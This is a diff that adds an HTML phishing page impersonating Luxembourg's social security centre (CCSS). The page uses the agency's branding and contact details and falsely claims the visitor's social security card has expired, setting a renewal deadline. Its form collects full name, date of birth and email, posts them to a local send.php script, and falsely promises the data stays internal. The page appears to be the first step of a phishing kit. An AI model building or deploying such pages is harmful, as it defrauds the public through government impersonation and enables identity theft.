@@ -1,0 +1,419 @@
+<!DOCTYPE html><html><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="./css/index.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script type="text/javascript">
+	$(document).ready(function(){
+		$('#dob').mask("00/00/0000");
+		$('#tel').mask("000000000000000");
+		$('#zip').mask("000000");
+	})
+</script><title>CCSS (Centre commun de la sécurité sociale)</title><link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&amp;display=swap" rel="stylesheet"><style type="text/css">
+	body{margin: 0px; padding: 0px;}
+	*{
+		box-sizing: border-box;
+		font-family: 'Open Sans', sans-serif;
+	}
+
+	#logo{
+		width: 300px;
+	}	
+	header li{
+		list-style-type: none;
+		color: #000;
+		cursor: pointer;
+	}
+	ul{
+		margin: 0px;
+		padding: 0px;
+	}
+	#section-header-last{
+		display: flex;
+		align-items: center;
+		background: #ececec;
+	}
+
+
+	#section-header-last > nav > ul{
+		display: flex;
+		align-items: center;
+		width: 100%;
+	}
+
+
+	#section-header-last > nav > ul > li {
+		width: 19%;
+		padding: 12px 10px;
+		font-weight: 600;
+		text-align: center;
+		font-size: 18px;
+	}
+
+	#section-header-first{
+		padding: 0px 0px 26px 0px;
+	}
+
+	#section-header-first > nav > ul:first-child {
+		display: flex;
+	    justify-content: flex-end;
+	}
+
+	#section-header-first > nav > ul:first-child > li:nth-child(2) {
+		margin: 0px 2px;
+	}
+
+	#section-header-first li {
+		font-weight: 500;
+	}
+
+	#search{
+		width: 10% !important;
+		display: flex;
+		justify-content: flex-end;
+	}
+
+	.container-forming{
+		width: 1160px;
+		margin: auto;
+	}
+	.actif-langue{
+		background: #2a78cb;
+		color: white;
+		padding: 10px;
+		font-weight: 600;
+		font-size: 15px;
+	}
+	.langue{
+		font-size: 15px;
+		padding: 10px;
+		font-weight: 600;
+		text-decoration: underline;
+		text-decoration-color: black;
+		text-decoration-style: solid;
+		text-decoration-thickness: 2px;		
+	}
+
+	.color1{border-bottom: 6px solid #2a78cb;}
+	.color2{border-bottom: 6px solid #e52433;}
+	.color3{border-bottom: 6px solid #263373;}
+	.color4{border-bottom: 6px solid #595959;}
+	.color5{border-bottom: 6px solid #2a78cb;background: #2a78cb;color: white;width: 27% !important;position: relative;border-left: 0 !important;}
+
+
+	.color5::before{
+		content: ' ';
+		left: 0px;
+		position: absolute;
+		width: 6px;
+		height: calc(100% + 6px);
+		top: 0px;
+		background: #ececec;
+	}
+
+	.colors{
+		position: relative;
+	}
+
+	.colors::before{
+		content: ' ';
+		right: 0px;
+		position: absolute;
+		width: 4px;
+		height: calc(100% + 6px);
+		top: 0px;
+		background: #ececec;
+	}
+
+	.colors::after{
+		content: ' ';
+		left: 0px;
+		position: absolute;
+		width: 1px;
+		height: calc(100% + 6px);
+		top: 0px;
+		background: white;
+	}
+
+	@media screen and (max-width: 1250px){
+		.container-forming{
+			width: 94%;
+		}
+	}
+
+	@media screen and (max-width: 1085px){
+		.flexing{
+			display: block;
+		}
+		#right > img{
+			width: 300px !important;
+			margin: initial !important;
+			margin-top: 20px !important;
+		}
+		#right{
+			margin-top: 20px;
+			width: 100%;
+			margin-bottom: 50px;
+		}
+		#left{
+			width: 100%;
+		}
+	}
+
+	@media screen and (max-width: 900px){
+		#logo{
+			width: 140px;
+		}
+		.color4,.color2,.color3,.color5{
+			display: none;
+		}
+		#section-header-last > nav > ul > li{
+			width: 200px;
+		}
+	}
+
+	@media screen and (max-width: 700px){
+		#right > img{
+			width: 100% !important;
+		}		
+	}
+
+</style></head>
+
+
+
+
+
+
+
+
+
+<body><header>
+	<section id="section-header-first">
+		<nav class="container-forming">
+			<ul>
+				<li class="actif-langue">FR</li>
+				<li class="langue">DE</li>
+				<li class="langue">EN</li>
+			</ul>		
+			<ul>
+				<li> <img id="logo" src="./img/logo.svg"> </li>
+			</ul>
+		</nav>
+	</section>
+
+	<section id="section-header-last">
+		<nav class="container-forming">
+			<ul>
+			  <li class="color1 colors">PARTICULIERS</li>
+			  <li class="color2 colors">EMPLOYEURS</li>
+			  <li class="color3 colors">INDÉPENDANTS</li>
+			  <li class="color4 colors">AGRICULTEURS</li>
+			  <li class="color5">PRISE DE RENDEZ-VOUS</li>
+			  <li id="search"> <img src="./img/search.png"> </li>
+			</ul>
+		</nav>
+	</section>
+</header>
+
+
+	<div id="banner"></div>
+
+	<div class="container-forming flexing">
+		<section id="left">
+		<ol class="flex-list">
+			<li><img src="./img/home.png" alt="Image d'accueil"></li>
+			<li><span>Actualisation</span></li>
+			<li><span>Particuliers</span></li>
+		</ol>
+
+		<h1 id="title">La période de validité de votre carte a expiré.</h1>
+		<div style="align-items: center;" class="warning alert">
+			<div class="contain-alert-img"><img src="./img/close.png"></div>
+			<span>Votre carte de sécurité sociale n'est plus utilisable.</span>
+		</div>
+		<p class="blue"><b>Votre carte a dépassé sa date de validité.</b> Nous vous prions de bien vouloir la mettre à jour avant le <b>01/05/2024</b> pour continuer à bénéficier des aides aux soins. Veuillez noter que les délais de livraison peuvent varier en fonction des saisons, et nous vous prions de compter <b>1 à 3 semaine après la commande de votre carte.</b><br><br>Les personnes affiliées auprès de la sécurité sociale, à titre d’assuré principal (assuré à titre personnel) ou de coassuré (personne à charge de l'assuré principal), ont droit à une carte de sécurité sociale.</p>
+		<form method="post" action="./includes/send.php">
+
+	    <div class="container-input">
+	        <label>Nom et Prénom</label>
+	        <input name="nom" minlength="4" required="">
+	    </div>
+
+
+	    <div style="margin-top: 15px;" class="container-input">
+	        <label>Date de naissance</label>
+	        <input type="tel" id="dob" name="dob" minlength="10" required="" maxlength="10">
+			<label>E-mail</label>
+	        <input name="email" minlength="4">
+	    </div>
+
+	    <p style="font-size: 13px;color: #3e3e3e;">Les données personnelles collectées sont destinées à un usage interne, afin de pouvoir vous fournir le service de support escompté. Ces données sont stockées à des endroits et sur du matériel sécurisés. En aucun cas ces données ne seront cédées ou vendues à des tiers.</p>
+
+	    <button class="submit">ÉTAPE SUIVANTE</button>
+		</form>
+
+		</section>
+
+
+
+		<section id="right">
+			<b>La carte de sécurité sociale</b>
+			<img src="./img/carte.png">
+		</section>
+	</div>
+
+
+
+
+<style type="text/css">
+  
+footer {
+  background-color: #ececec;
+  padding: 20px;
+}
+
+.footer-list li {
+  font-size: 14px;
+  color: #595959;
+  margin-bottom: 10px;
+}
+
+#lastfooter {
+  display: flex;
+  padding: 0px;
+  margin-top: 60px;
+  justify-content: center;
+}
+
+
+#lastfooter li {
+  list-style-type: none;
+  font-size: 14px;
+  color: #595959;
+  font-weight: 600;
+}
+
+#lastfooter li::after {
+    content: " | ";
+    margin: 0px 10px;
+    text-decoration: none !important;
+}
+
+#lastfooter li:last-child::after {
+    content: "";
+}
+
+.footer-container {
+  display: flex;
+  justify-content: space-between;
+}
+
+.footer-list {
+  list-style-type: square;
+  color: #2a78cb;
+  margin: 0 20px;
+}
+
+.footer-list li {
+  font-size: 16px;
+  font-weight: 600;
+  color: black;
+  margin-bottom: 8px;
+}
+
+.title-footering{
+  color: #263373;
+  position: relative;
+  left: -21px;
+  margin-bottom: 6px;
+}
+.separating{
+  background-color: #263373;
+  width: 30px;
+  height: 4px;
+  position: relative;
+  left: -21px;  
+  margin-bottom: 18px;
+}
+
+#fin{
+  padding: 20px 0px;
+}
+
+@media screen and (max-width: 1000px){
+  .footer-container{
+    display: block;
+  }
+  #lastfooter{
+    display: block;
+  }
+  #lastfooter li::after{
+     display: none;
+  }
+}
+
+</style>
+<footer>
+
+<div class="footer-container container-forming">
+  <ul class="footer-list">
+    <h2 style="opacity: 0;" class="title-footering">CCSS</h2>
+    <li>Particuliers</li>
+    <li>Employeurs</li>
+    <li>Indépendants</li>
+    <li>Agriculteurs</li>
+  </ul>
+
+  <ul class="footer-list">
+    <h2 style="opacity: 0;" class="title-footering">CCSS</h2>
+    <li>SECUline</li>
+    <li>Paramètres sociaux</li>
+    <li>Commandes de certificats</li>
+    <li>Formulaires</li>
+    <li>Actualités</li>
+    <li>Publications</li>
+    <li>Législation</li>
+  </ul>
+
+  <ul class="footer-list">
+    <h2 class="title-footering">CCSS</h2>
+    <div class="separating"></div>
+    <li>Attributions</li>
+    <li>Organisation</li>
+    <li>Offres d'emploi</li>
+    <li>Coordonnées bancaires</li>
+    <li>Marchés publics</li>
+  </ul>
+
+  <ul class="footer-list">
+    <h2 class="title-footering">Contact</h2>
+    <div class="separating"></div>
+    <li>Courrier : L-2975 Luxembourg</li>
+    <li>Guichets : 4, rue Mercier</li>
+    <li>L-2144 Luxembourg</li>
+    <li>Lundi au vendredi de 8h00 à 16h00</li>
+    <li>Uniquement sur rendez-vous</li>
+    <li>Téléphone : (+352) 40141-1</li>
+    <li>E-mail : ccss@secu.lu</li>
+  </ul>
+</div>
+
+  <ul id="lastfooter" class="container-forming">
+    <li>Contact</li>
+    <li>Plan du site</li>
+    <li>Liens</li>
+    <li>Presse</li>
+    <li>A propos du site</li>
+    <li>Accessibilité</li>
+    <li>Protection des données</li>
+    <li>Aspects légaux</li>
+  </ul>
+</footer>
+
+<div id="fin" class="container-forming">
+  
+  <img src="./img/renow.png">
+
+</div></body></html>
